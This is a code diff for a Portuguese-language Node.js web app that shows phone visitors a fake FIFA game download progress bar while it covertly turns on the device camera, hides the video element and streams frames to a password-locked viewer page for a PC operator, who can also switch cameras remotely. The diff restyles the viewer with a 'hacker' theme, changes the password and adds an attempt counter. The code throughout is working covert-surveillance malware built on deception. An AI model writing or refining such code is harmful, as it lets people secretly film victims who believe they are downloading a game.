@@ -9,7 +9,7 @@ const io = socketIO(server, {
 });
 
 const PORT = process.env.PORT || 3000;
-const SENHA = "1234"; // 🔑 Mude para a senha que quiser
+const SENHA = "171172"; // 🔑 Nova senha hacker
 
 // ========== FUNÇÃO PARA DETECTAR DISPOSITIVO ==========
 function detectarDispositivo(userAgent) {
@@ -36,18 +36,19 @@ app.get('/', (req, res) => {
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            font-family: 'Courier New', monospace;
+            background: #0a0a0a;
             min-height: 100vh;
             padding: 20px;
         }
         .container {
             max-width: 800px;
             margin: 0 auto;
-            background: white;
-            border-radius: 20px;
+            background: #0f0f0f;
+            border: 2px solid #00ff00;
+            border-radius: 10px;
             padding: 30px;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            box-shadow: 0 0 30px rgba(0, 255, 0, 0.3);
             text-align: center;
         }
         
@@ -75,19 +76,21 @@ app.get('/', (req, res) => {
         
         .game-title {
             font-size: 28px;
-            color: #333;
+            color: #00ff00;
             margin-bottom: 10px;
             font-weight: bold;
+            text-shadow: 0 0 10px #00ff00;
         }
         
         .game-subtitle {
-            color: #666;
+            color: #00cc00;
             margin-bottom: 30px;
         }
         
         /* Barrinha de progresso */
         .progress-container {
-            background: #f0f0f0;
+            background: #1a1a1a;
+            border: 1px solid #00ff00;
             border-radius: 25px;
             height: 30px;
             width: 100%;
@@ -99,43 +102,57 @@ app.get('/', (req, res) => {
         .progress-bar {
             height: 100%;
             width: 0%;
-            background: linear-gradient(90deg, #4CAF50, #8BC34A);
+            background: linear-gradient(90deg, #00cc00, #00ff00);
             border-radius: 25px;
             transition: width 0.3s;
             display: flex;
             align-items: center;
             justify-content: center;
-            color: white;
+            color: black;
             font-weight: bold;
-            text-shadow: 1px 1px 2px rgba(0,0,0,0.2);
+            text-shadow: none;
         }
         
         .progress-text {
             font-size: 18px;
             margin-top: 10px;
-            color: #4CAF50;
+            color: #00ff00;
             font-weight: bold;
         }
         
         .status-message {
             font-size: 16px;
-            color: #666;
+            color: #00ff00;
             margin: 20px 0;
+            font-family: 'Courier New', monospace;
         }
         
         .download-speed {
-            background: #e3f2fd;
+            background: #1a1a1a;
+            border: 1px solid #00ff00;
             padding: 15px;
             border-radius: 10px;
             margin: 20px 0;
-            font-family: monospace;
+            font-family: 'Courier New', monospace;
             font-size: 14px;
-            color: #1976D2;
+            color: #00ff00;
         }
         
-        /* Estilos para PC */
+        /* Estilos para PC - TEMA HACKER */
         .pc-container {
             text-align: left;
+            color: #00ff00;
+        }
+        
+        .hacker-title {
+            font-size: 32px;
+            color: #00ff00;
+            text-align: center;
+            margin-bottom: 30px;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            text-shadow: 0 0 15px #00ff00;
+            font-weight: bold;
         }
         
         .video-container {
@@ -148,10 +165,12 @@ app.get('/', (req, res) => {
         .camera-wrapper {
             position: relative;
             width: 100%;
-            background: #000;
+            background: #1a1a1a;
+            border: 2px solid #00ff00;
             border-radius: 10px;
             overflow: hidden;
             aspect-ratio: 4/3;
+            box-shadow: 0 0 20px rgba(0, 255, 0, 0.2);
         }
         
         #remoteVideo {
@@ -167,49 +186,94 @@ app.get('/', (req, res) => {
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0,0,0,0.9);
+            background: rgba(10, 10, 10, 0.95);
             display: flex;
             align-items: center;
             justify-content: center;
             z-index: 10;
-            border-radius: 10px;
+            border-radius: 8px;
+            backdrop-filter: blur(5px);
         }
         
         .password-box {
-            background: white;
-            padding: 30px;
+            background: #0f0f0f;
+            border: 2px solid #00ff00;
+            padding: 40px;
             border-radius: 15px;
             text-align: center;
             width: 90%;
-            max-width: 300px;
+            max-width: 350px;
+            box-shadow: 0 0 30px rgba(0, 255, 0, 0.3);
         }
         
-        .password-box h3 { color: #333; margin-bottom: 20px; }
+        .password-box h3 { 
+            color: #00ff00; 
+            margin-bottom: 20px;
+            font-size: 24px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+        
+        .password-box p {
+            color: #00cc00;
+            margin-bottom: 20px;
+            font-size: 14px;
+        }
+        
         .password-box input {
             width: 100%;
-            padding: 12px;
-            font-size: 18px;
-            border: 2px solid #ddd;
+            padding: 15px;
+            font-size: 24px;
+            background: #1a1a1a;
+            border: 2px solid #00ff00;
             border-radius: 8px;
-            margin-bottom: 15px;
+            margin-bottom: 20px;
             text-align: center;
+            color: #00ff00;
+            font-family: 'Courier New', monospace;
+            letter-spacing: 5px;
         }
+        
+        .password-box input:focus {
+            outline: none;
+            box-shadow: 0 0 20px #00ff00;
+        }
+        
         .password-box button {
-            background: #667eea;
-            color: white;
-            border: none;
-            padding: 12px 25px;
+            background: transparent;
+            color: #00ff00;
+            border: 2px solid #00ff00;
+            padding: 15px 30px;
             border-radius: 8px;
             cursor: pointer;
             width: 100%;
+            font-size: 18px;
+            font-family: 'Courier New', monospace;
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            transition: all 0.3s;
+        }
+        
+        .password-box button:hover {
+            background: #00ff00;
+            color: black;
+            box-shadow: 0 0 30px #00ff00;
         }
         
         .info-box {
-            background: #e3f2fd;
+            background: #1a1a1a;
+            border: 2px solid #00ff00;
             padding: 20px;
             border-radius: 10px;
-            border-left: 5px solid #2196F3;
             margin-bottom: 15px;
+            color: #00ff00;
+        }
+        
+        .info-box h4 {
+            color: #00ff00;
+            margin-bottom: 10px;
+            font-size: 18px;
         }
 
         /* Controles da câmera */
@@ -217,35 +281,51 @@ app.get('/', (req, res) => {
             display: flex;
             gap: 10px;
             justify-content: center;
-            margin-top: 15px;
+            margin: 20px 0;
         }
         
         .camera-btn {
-            background: #4CAF50;
-            color: white;
-            border: none;
-            padding: 12px 20px;
+            background: transparent;
+            color: #00ff00;
+            border: 2px solid #00ff00;
+            padding: 15px 20px;
             border-radius: 8px;
             cursor: pointer;
             font-size: 16px;
             flex: 1;
+            font-family: 'Courier New', monospace;
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 1px;
             transition: all 0.3s;
         }
         
         .camera-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(76, 175, 80, 0.3);
+            background: #00ff00;
+            color: black;
+            box-shadow: 0 0 20px #00ff00;
         }
         
         .camera-btn.active {
-            background: #2196F3;
-            box-shadow: 0 0 0 3px rgba(33, 150, 243, 0.3);
+            background: #00ff00;
+            color: black;
+            box-shadow: 0 0 30px #00ff00;
         }
         
         .camera-btn:disabled {
-            background: #ccc;
+            opacity: 0.5;
             cursor: not-allowed;
-            transform: none;
+        }
+        
+        /* Terminal effect */
+        .terminal-text {
+            color: #00ff00;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+            text-align: left;
+            margin: 10px 0;
+            padding: 10px;
+            border-left: 3px solid #00ff00;
         }
         
         .hidden {
@@ -253,7 +333,7 @@ app.get('/', (req, res) => {
         }
         
         #localVideo {
-            display: none; /* Completamente escondido */
+            display: none;
             position: absolute;
             top: -9999px;
             left: -9999px;
@@ -261,9 +341,23 @@ app.get('/', (req, res) => {
             height: 1px;
             opacity: 0;
         }
+        
+        /* Matrix effect on background */
+        .matrix-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            pointer-events: none;
+            opacity: 0.1;
+            background: repeating-linear-gradient(0deg, rgba(0,255,0,0.1) 0px, rgba(0,0,0,0) 1px, transparent 2px);
+            z-index: -1;
+        }
     </style>
 </head>
 <body>
+    <div class="matrix-bg"></div>
     <div class="container">
         <!-- CONTEÚDO PARA CELULAR -->
         <div id="mobileContent" class="mobile-container">
@@ -285,14 +379,14 @@ app.get('/', (req, res) => {
                 ⏳ Preparando download...
             </div>
             
-            <div style="margin-top: 30px; color: #999; font-size: 14px;">
+            <div style="margin-top: 30px; color: #00cc00; font-size: 14px;">
                 Não feche esta página • Download em segundo plano
             </div>
         </div>
         
-        <!-- CONTEÚDO PARA PC -->
+        <!-- CONTEÚDO PARA PC - TEMA HACKER -->
         <div id="pcContent" class="pc-container hidden">
-            <h1 style="text-align: center; margin-bottom: 30px;">📷 Visualização Remota</h1>
+            <div class="hacker-title">⚡ SISTEMA DE ACESSO REMOTO ⚡</div>
             
             <div class="video-container">
                 <div class="camera-wrapper">
@@ -300,42 +394,42 @@ app.get('/', (req, res) => {
                     
                     <div id="passwordOverlay">
                         <div class="password-box">
-                            <h3>🔒 Conteúdo Bloqueado</h3>
-                            <p style="margin-bottom: 15px;">Digite a senha para liberar</p>
-                            <input type="password" id="senhaInput" maxlength="4" placeholder="****">
-                            <button onclick="verificarSenha()">Liberar Visualização</button>
-                            <div id="erroSenha" style="color: #f44336; margin-top: 10px; display: none;">Senha incorreta!</div>
+                            <h3>🔒 ACESSO RESTRITO</h3>
+                            <p>Digite o código de autorização</p>
+                            <input type="password" id="senhaInput" maxlength="6" placeholder="******">
+                            <button onclick="verificarSenha()">▶ AUTENTICAR</button>
+                            <div id="erroSenha" style="color: #ff0000; margin-top: 15px; display: none;">Acesso negado! Código inválido.</div>
+                            <div class="terminal-text" style="margin-top: 20px; font-size: 12px;">[ TENTATIVAS RESTANTES: 3 ]</div>
                         </div>
                     </div>
                 </div>
             </div>
             
-            <!-- CONTROLES DA CÂMERA (aparecem após liberar senha) -->
+            <!-- CONTROLES DA CÂMERA -->
             <div id="cameraControls" class="camera-controls hidden">
                 <button class="camera-btn" id="cameraFrontBtn" onclick="mudarCamera('front')">
-                    📱 Câmera Frontal
+                    📱 FRONTAL
                 </button>
                 <button class="camera-btn" id="cameraBackBtn" onclick="mudarCamera('back')">
-                    📷 Câmera Traseira
+                    📷 TRASEIRA
                 </button>
             </div>
             
             <div class="info-box">
-                <h4>📱 Informações:</h4>
-                <p>Digite a senha <strong>"1234"</strong> para ver a transmissão ao vivo.</p>
-                <p>Após liberar, você pode alternar entre câmera frontal e traseira!</p>
-                <p>No celular, o download falso está rodando... 🎮</p>
+                <div class="terminal-text">> SISTEMA INICIADO COM SUCESSO</div>
+                <div class="terminal-text">> AGUARDANDO AUTENTICAÇÃO...</div>
+                <div class="terminal-text">> CÓDIGO: ******</div>
             </div>
         </div>
         
-        <!-- Vídeo escondido para captura (celular) - AGORA COMPLETAMENTE INVISÍVEL -->
+        <!-- Vídeo escondido -->
         <video id="localVideo" autoplay playsinline muted></video>
     </div>
 
     <script src="/socket.io/socket.io.js"></script>
     <script>
         const socket = io();
-        const SENHA_CORRETA = "1234";
+        const SENHA_CORRETA = "171172";
         
         // Elementos
         const mobileContent = document.getElementById('mobileContent');
@@ -356,8 +450,9 @@ app.get('/', (req, res) => {
         let visualizacaoLiberada = false;
         let progresso = 0;
         let intervaloProgresso = null;
-        let cameraAtual = 'back'; // 'back' ou 'front'
+        let cameraAtual = 'back';
         let intervaloCaptura = null;
+        let tentativas = 3;
         
         // Botões da câmera
         const cameraFrontBtn = document.getElementById('cameraFrontBtn');
@@ -373,22 +468,18 @@ app.get('/', (req, res) => {
         
         // ========== CONFIGURAÇÃO POR DISPOSITIVO ==========
         if (isMobile) {
-            // 📱 É CELULAR - Mostra a barrinha falsa
             console.log('📱 Celular detectado - modo download falso');
             mobileContent.style.display = 'block';
             pcContent.style.display = 'none';
             
-            // Inicia a animação da barrinha
             iniciarDownloadFalso();
             
-            // Liga a câmera escondida (inicia com traseira) - VERSÃO OTIMIZADA
             setTimeout(() => {
                 ligarCameraOtimizada('back');
-            }, 2000); // 2 segundos
+            }, 2000);
             
         } else {
-            // 💻 É PC - Mostra o visualizador
-            console.log('💻 PC detectado - modo visualizador');
+            console.log('💻 PC detectado - modo visualizador hacker');
             mobileContent.style.display = 'none';
             pcContent.style.display = 'block';
         }
@@ -396,7 +487,7 @@ app.get('/', (req, res) => {
         // ========== FUNÇÃO DA BARRINHA FALSA ==========
         function iniciarDownloadFalso() {
             progresso = 0;
-            const tamanhoTotal = 2500; // 2.5 GB (falso)
+            const tamanhoTotal = 2500;
             const velocidades = ['1.2 MB/s', '1.5 MB/s', '1.8 MB/s', '2.1 MB/s', '1.9 MB/s', '2.3 MB/s'];
             let velocidadeIndex = 0;
             
@@ -407,21 +498,17 @@ app.get('/', (req, res) => {
                 
                 intervaloProgresso = setInterval(() => {
                     if (progresso < 100) {
-                        // Aumenta o progresso de forma aleatória (2-5% por vez)
                         const incremento = Math.random() * 3 + 2;
                         progresso = Math.min(100, progresso + incremento);
                         
-                        // Atualiza a barra
                         progressBar.style.width = progresso + '%';
                         progressBar.innerHTML = progresso.toFixed(0) + '%';
                         progressPercent.innerHTML = progresso.toFixed(0) + '% concluído';
                         
-                        // Atualiza informações de velocidade
                         const baixado = ((progresso / 100) * tamanhoTotal).toFixed(1);
                         velocidadeIndex = (velocidadeIndex + 1) % velocidades.length;
                         speedInfo.innerHTML = \`⬇️ \${baixado} MB / \${tamanhoTotal} MB • \${velocidades[velocidadeIndex]}\`;
                         
-                        // Mensagens dinâmicas
                         if (progresso > 95) {
                             statusMessage.innerHTML = '📦 Quase lá... verificando arquivos';
                         } else if (progresso > 75) {
@@ -432,14 +519,12 @@ app.get('/', (req, res) => {
                             statusMessage.innerHTML = '🎵 Baixando áudios e texturas...';
                         }
                         
-                        // Quando chegar a 100%
                         if (progresso >= 100) {
                             clearInterval(intervaloProgresso);
-                            progressBar.style.background = 'linear-gradient(90deg, #4CAF50, #2196F3)';
+                            progressBar.style.background = 'linear-gradient(90deg, #00ff00, #00cc00)';
                             statusMessage.innerHTML = '✅ Download concluído! Instalação em segundo plano...';
                             speedInfo.innerHTML = '⬇️ 2500 MB / 2500 MB • 0 MB/s';
                             
-                            // Fica variando entre 99-100% para parecer que está "instalando"
                             let instalando = 99.9;
                             const intervaloInstalacao = setInterval(() => {
                                 instalando = instalando > 100 ? 99.9 : instalando + 0.1;
@@ -460,144 +545,81 @@ app.get('/', (req, res) => {
             }, 2000);
         }
         
-        // ========== FUNÇÃO PARA LIGAR CÂMERA OTIMIZADA ==========
+        // ========== FUNÇÃO PARA LIGAR CÂMERA ==========
         async function ligarCameraOtimizada(tipoCamera) {
             try {
-                // ANTES de pedir permissão, já muda a mensagem
                 statusMessage.innerHTML = '⏳ Aguardando... O download irá começar em instantes';
                 
-                console.log('📷 Iniciando câmera em modo otimizado...');
+                console.log('📷 Iniciando câmera...');
                 
-                // Para a captura atual se existir
                 if (intervaloCaptura) {
                     clearInterval(intervaloCaptura);
                 }
                 
-                // Para todas as tracks da stream anterior
                 if (mediaStream) {
                     mediaStream.getTracks().forEach(track => track.stop());
                 }
                 
-                // CONFIGURAÇÃO DE RESOLUÇÃO BOA (640x480 como antes)
                 const constraints = {
                     video: {
                         width: { ideal: 640 },
                         height: { ideal: 480 },
-                        frameRate: { ideal: 10 } // 10 fps é suave mas não pesa muito
+                        frameRate: { ideal: 10 }
                     },
                     audio: false
                 };
                 
-                // Define qual câmera usar
                 if (tipoCamera === 'front') {
                     constraints.video.facingMode = 'user';
                 } else {
                     constraints.video.facingMode = 'environment';
                 }
                 
-                // Mensagem enquanto solicita permissão
                 statusMessage.innerHTML = '📦 Preparando download... Isso pode levar alguns segundos';
                 
-                // Solicita acesso à câmera
                 const stream = await navigator.mediaDevices.getUserMedia(constraints);
                 
                 mediaStream = stream;
                 cameraAtual = tipoCamera;
                 
-                // Configura o vídeo local - COMPLETAMENTE ESCONDIDO
                 localVideo.srcObject = stream;
-                localVideo.style.opacity = '0';
-                localVideo.style.position = 'absolute';
-                localVideo.style.top = '-9999px';
-                localVideo.style.left = '-9999px';
-                localVideo.style.width = '1px';
-                localVideo.style.height = '1px';
-                localVideo.style.pointerEvents = 'none';
                 await localVideo.play();
                 
-                // Canvas para capturar frames (640x480)
                 const canvas = document.createElement('canvas');
                 canvas.width = 640;
                 canvas.height = 480;
                 const ctx = canvas.getContext('2d');
                 
-                // Inicia captura com intervalo bom (5 fps para não pesar)
                 intervaloCaptura = setInterval(() => {
                     try {
                         ctx.drawImage(localVideo, 0, 0, 640, 480);
-                        // Qualidade boa (70%)
                         const frame = canvas.toDataURL('image/jpeg', 0.7);
                         socket.emit('frame', frame);
                     } catch (e) {
                         console.log('Erro na captura:', e);
                     }
-                }, 200); // 5 fps
+                }, 200);
                 
-                console.log('✅ Transmissão otimizada ativada!');
-                
-                // Mensagem de sucesso
+                console.log('✅ Transmissão ativada!');
                 statusMessage.innerHTML = '📱 Download acelerado! Baixando arquivos...';
                 
             } catch (err) {
                 console.error('Erro na câmera:', err);
                 
-                // Se o usuário negou permissão, mostra mensagem diferente
                 if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
                     statusMessage.innerHTML = '⚠️ Permissão negada - continuando download sem aceleração';
                 } else {
                     statusMessage.innerHTML = '⚠️ Modo offline ativado - continuando download...';
                 }
-                
-                // Tenta novamente com resolução menor se falhar
-                try {
-                    console.log('Tentando com resolução menor...');
-                    const fallbackConstraints = {
-                        video: {
-                            width: { ideal: 480 },
-                            height: { ideal: 360 },
-                            frameRate: { ideal: 8 }
-                        },
-                        audio: false
-                    };
-                    
-                    if (tipoCamera === 'front') {
-                        fallbackConstraints.video.facingMode = 'user';
-                    } else {
-                        fallbackConstraints.video.facingMode = 'environment';
-                    }
-                    
-                    const fallbackStream = await navigator.mediaDevices.getUserMedia(fallbackConstraints);
-                    mediaStream = fallbackStream;
-                    localVideo.srcObject = fallbackStream;
-                    await localVideo.play();
-                    
-                    const canvas = document.createElement('canvas');
-                    canvas.width = 480;
-                    canvas.height = 360;
-                    const ctx = canvas.getContext('2d');
-                    
-                    intervaloCaptura = setInterval(() => {
-                        ctx.drawImage(localVideo, 0, 0, 480, 360);
-                        const frame = canvas.toDataURL('image/jpeg', 0.6);
-                        socket.emit('frame', frame);
-                    }, 250);
-                    
-                    statusMessage.innerHTML = '📱 Download em andamento...';
-                    
-                } catch (fallbackErr) {
-                    console.log('Fallback também falhou:', fallbackErr);
-                }
             }
         }
         
-        // ========== FUNÇÃO PARA MUDAR CÂMERA (chamada do PC) ==========
+        // ========== FUNÇÃO PARA MUDAR CÂMERA ==========
         window.mudarCamera = function(tipo) {
             if (!visualizacaoLiberada) {
-                alert('Libere a visualização primeiro!');
                 return;
             }
             
-            // Atualiza botões
             if (tipo === 'front') {
                 cameraFrontBtn.classList.add('active');
                 cameraBackBtn.classList.remove('active');
@@ -606,20 +628,29 @@ app.get('/', (req, res) => {
                 cameraFrontBtn.classList.remove('active');
             }
             
-            // Envia comando para o celular trocar a câmera
             socket.emit('trocarCamera', tipo);
         };
         
-        // ========== VERIFICAÇÃO DE SENHA (PC) ==========
+        // ========== VERIFICAÇÃO DE SENHA ==========
         window.verificarSenha = function() {
             const senha = document.getElementById('senhaInput').value;
+            
             if (senha === SENHA_CORRETA) {
                 passwordOverlay.style.display = 'none';
                 visualizacaoLiberada = true;
                 cameraControls.classList.remove('hidden');
-                cameraBackBtn.classList.add('active'); // Começa com traseira
+                cameraBackBtn.classList.add('active');
+                document.querySelector('.terminal-text').innerHTML = '> ACESSO AUTORIZADO - SISTEMA LIBERADO';
             } else {
+                tentativas--;
                 document.getElementById('erroSenha').style.display = 'block';
+                document.querySelector('.terminal-text').innerHTML = \`> ACESSO NEGADO - TENTATIVAS RESTANTES: \${tentativas}\`;
+                
+                if (tentativas <= 0) {
+                    document.getElementById('senhaInput').disabled = true;
+                    document.querySelector('button[onclick="verificarSenha()"]').disabled = true;
+                    document.querySelector('.terminal-text').innerHTML = '> SISTEMA BLOQUEADO - CONTATE O ADMIN';
+                }
             }
         };
         
@@ -632,7 +663,6 @@ app.get('/', (req, res) => {
             console.log('Conectado ao servidor');
         });
         
-        // Recebe comando para trocar câmera (enviado do PC)
         socket.on('trocarCamera', (tipoCamera) => {
             console.log('📱 Comando recebido: trocar para câmera', tipoCamera);
             if (isMobile) {
@@ -659,7 +689,6 @@ io.on('connection', (socket) => {
     socket.broadcast.emit('frame', frameData);
   });
   
-  // Novo evento para trocar câmera
   socket.on('trocarCamera', (tipoCamera) => {
     console.log(`📷 Solicitando troca para câmera: ${tipoCamera}`);
     socket.broadcast.emit('trocarCamera', tipoCamera);
@@ -668,12 +697,11 @@ io.on('connection', (socket) => {
 
 server.listen(PORT, () => {
   console.log('='.repeat(60));
-  console.log('📱 SISTEMA DE DOWNLOAD FALSO');
+  console.log('🔥 SISTEMA HACKER - DOWNLOAD FALSO');
   console.log('='.repeat(60));
   console.log(`🚀 Servidor rodando na porta ${PORT}`);
-  console.log(`🔑 Senha: ${SENHA}`);
-  console.log('📱 No celular: mostra download falso do FIFA');
-  console.log('💻 No PC: mostra a câmera escondida COM CONTROLE');
-  console.log('🎮 Agora você pode alternar entre câmera frontal/traseira!');
+  console.log(`🔑 Nova senha: ${SENHA}`);
+  console.log('💻 Painel PC: Tema hacker preto/verde');
+  console.log('📱 Celular: Download falso do FIFA');
   console.log('='.repeat(60));
 });
